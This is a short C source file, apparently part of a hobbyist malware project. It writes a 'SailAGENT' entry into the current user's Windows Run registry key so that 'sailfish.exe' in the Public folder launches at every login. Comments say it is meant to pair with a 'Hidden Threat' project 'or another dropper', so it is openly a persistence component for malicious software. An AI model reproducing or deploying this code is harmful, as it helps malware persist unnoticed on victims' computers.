#include <windows.h>
#include <stdio.h>
//This needs to be used with the “Hidden Threat” project (or another dropper). Because right now, I don’t want to complicate things further by writing code to determine the file’s location and copy it there.
//I just realized . It's very likely that the program will call this function over and over again every time it starts, and at some point it will trigger something like a buffer overflow. I need to fix this. 
int HkcuRegOpenKeyExA() {
    HKEY hKEY;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKEY
    );
    if (result == ERROR_SUCCESS) {
        const char* valueName = "SailAGENT";
        const char* exePath = "C:\\Users\\Public\\sailfish.exe"; //Yeah, I'll have to fix this one, too.
        RegSetValueExA(
            hKEY,
            valueName,
            0,
            REG_SZ,
            (const BYTE*)exePath,
            strlen(exePath) + 1
        );
        RegCloseKey(hKEY);
        printf("we made it");
    } else {
        printf("we didnt made it %ld\n", result);
    }
    return 0;

}